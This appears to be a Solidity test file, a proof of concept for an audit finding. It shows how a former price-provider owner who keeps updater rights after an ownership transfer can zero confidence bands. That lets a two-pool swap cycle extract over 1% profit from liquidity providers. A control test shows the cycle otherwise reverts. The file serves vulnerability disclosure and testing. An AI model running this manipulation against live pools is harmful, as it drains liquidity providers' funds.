// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {MetricOmmPool} from "@metric-core/MetricOmmPool.sol";
import {IMetricOmmSimpleRouter} from "../contracts/interfaces/IMetricOmmSimpleRouter.sol";
import {MockPriceProviderRouter, SimpleRouterTestBase} from "./helpers/SimpleRouterTestBase.sol";
import {PriceProvider} from "smart-contracts-poc/contracts/PriceProvider.sol";
import {PriceProviderFactory} from "smart-contracts-poc/contracts/PriceProviderFactory.sol";
import {IOffchainOracle} from "smart-contracts-poc/contracts/interfaces/IOffchainOracle.sol";

contract OwnershipTransitionOracle is IOffchainOracle {
  struct Feed {
    uint256 mid;
    uint256 spreadBps;
    uint256 refTime;
  }

  mapping(bytes32 feedId => Feed) private _feeds;

  function setFeed(bytes32 feedId, uint256 mid, uint256 spreadBps, uint256 refTime) external {
    _feeds[feedId] = Feed(mid, spreadBps, refTime);
  }

  function price(bytes32 feedId, address)
    external
    view
    returns (uint256 mid, uint256 spread, uint16 spread1, uint256 refTime)
  {
    Feed memory feed = _feeds[feedId];
    return (feed.mid, feed.spreadBps, 0, feed.refTime);
  }

  function priceGuard(bytes32) external pure override returns (uint128, uint128) {
    return (0, 0);
  }

  function getOracleData(bytes32) external pure override returns (OracleData memory data) {
    return data;
  }

  function getOracleDataBulk(bytes32[] calldata) external pure override returns (OracleData[] memory data) {
    return data;
  }
}

contract ProviderOwnershipStaleUpdaterPoolPoC is SimpleRouterTestBase {
  address private constant FORMER_OWNER = address(0xA11CE);
  address private constant NEW_OWNER = address(0xB0B);
  bytes32 private constant LOW_FEED = keccak256("LOW_FEED");
  bytes32 private constant HIGH_FEED = keccak256("HIGH_FEED");

  PriceProviderFactory private providerFactory;
  OwnershipTransitionOracle private priceOracle;
  PriceProvider private lowProvider;
  PriceProvider private highProvider;
  MetricOmmPool private lowPricePool;
  MetricOmmPool private highPricePool;

  function setUp() public override {
    super.setUp();
    vm.warp(1_800_000_000);

    providerFactory = new PriceProviderFactory(address(this));
    priceOracle = new OwnershipTransitionOracle();
    priceOracle.setFeed(LOW_FEED, 100e8, 500, block.timestamp);
    priceOracle.setFeed(HIGH_FEED, 104e8, 500, block.timestamp);

    vm.startPrank(FORMER_OWNER);
    lowProvider = PriceProvider(
      providerFactory.createPriceProvider(address(priceOracle), LOW_FEED, 1e15, 1 days, address(weth), address(token1))
    );
    highProvider = PriceProvider(
      providerFactory.createPriceProvider(address(priceOracle), HIGH_FEED, 1e15, 1 days, address(weth), address(token1))
    );

    address[] memory providers = _providers();
    uint256[] memory fullConfidence = new uint256[](2);
    fullConfidence[0] = 1_000_000;
    fullConfidence[1] = 1_000_000;
    providerFactory.setConfidence(providers, fullConfidence);
    vm.stopPrank();

    oracle = MockPriceProviderRouter(address(lowProvider));
    lowPricePool = _deployPool(address(weth), address(token1));
    oracle = MockPriceProviderRouter(address(highProvider));
    highPricePool = _deployPool(address(weth), address(token1));

    vm.deal(address(this), 1_200 ether);
    weth.deposit{value: 1_200 ether}();
    weth.transfer(address(lpContract), 1_200 ether);
    token1.mint(address(lpContract), 1_000e18);
    lpContract.addLiquidityRange(address(lowPricePool), 10, -4, 4, 100e18);
    lpContract.addLiquidityRange(address(highPricePool), 11, -4, 4, 100e18);
  }

  function test_staleUpdaterExtractsValueFromRealMetricPools() public {
    vm.startPrank(FORMER_OWNER);
    providerFactory.grantUpdater(address(lowProvider), FORMER_OWNER);
    providerFactory.grantUpdater(address(highProvider), FORMER_OWNER);
    providerFactory.transferProviderOwnership(address(lowProvider), NEW_OWNER);
    providerFactory.transferProviderOwnership(address(highProvider), NEW_OWNER);
    vm.stopPrank();

    vm.warp(block.timestamp + lowProvider.CONFIDENCE_COOLDOWN());
    vm.prank(FORMER_OWNER);
    providerFactory.setConfidence(_providers(), new uint256[](2));

    uint128 amountIn = 100e18;
    address[] memory tokens = new address[](3);
    tokens[0] = address(token1);
    tokens[1] = address(weth);
    tokens[2] = address(token1);

    address[] memory pools = new address[](2);
    pools[0] = address(lowPricePool);
    pools[1] = address(highPricePool);

    uint256 balanceBefore = token1.balanceOf(swapper);
    vm.prank(swapper);
    uint256 amountOut = router.exactInput(
      IMetricOmmSimpleRouter.ExactInputParams({
        tokens: tokens,
        pools: pools,
        extensionDatas: new bytes[](2),
        zeroForOneBitMap: 2,
        amountIn: amountIn,
        amountOutMinimum: amountIn,
        recipient: swapper,
        deadline: _deadline()
      })
    );

    uint256 profit = amountOut - amountIn;
    uint256 profitBps = Math.mulDiv(profit, 10_000, amountIn);

    emit log_named_decimal_uint("real-pool cycle input", amountIn, 18);
    emit log_named_decimal_uint("real-pool cycle output", amountOut, 18);
    emit log_named_uint("real-pool profit after fees (bps)", profitBps);

    assertEq(token1.balanceOf(swapper), balanceBefore + profit);
    assertGt(profitBps, 100, "stale updater should cause more than 1% realized LP loss");
    _assertRouterEmpty();
  }

  function test_controlFullBandsCannotBreakEvenInRealPools() public {
    uint128 amountIn = 100e18;
    address[] memory tokens = new address[](3);
    tokens[0] = address(token1);
    tokens[1] = address(weth);
    tokens[2] = address(token1);

    address[] memory pools = new address[](2);
    pools[0] = address(lowPricePool);
    pools[1] = address(highPricePool);

    vm.expectRevert();
    vm.prank(swapper);
    router.exactInput(
      IMetricOmmSimpleRouter.ExactInputParams({
        tokens: tokens,
        pools: pools,
        extensionDatas: new bytes[](2),
        zeroForOneBitMap: 2,
        amountIn: amountIn,
        amountOutMinimum: amountIn,
        recipient: swapper,
        deadline: _deadline()
      })
    );
  }

  function _providers() private view returns (address[] memory providers) {
    providers = new address[](2);
    providers[0] = address(lowProvider);
    providers[1] = address(highProvider);
  }
}
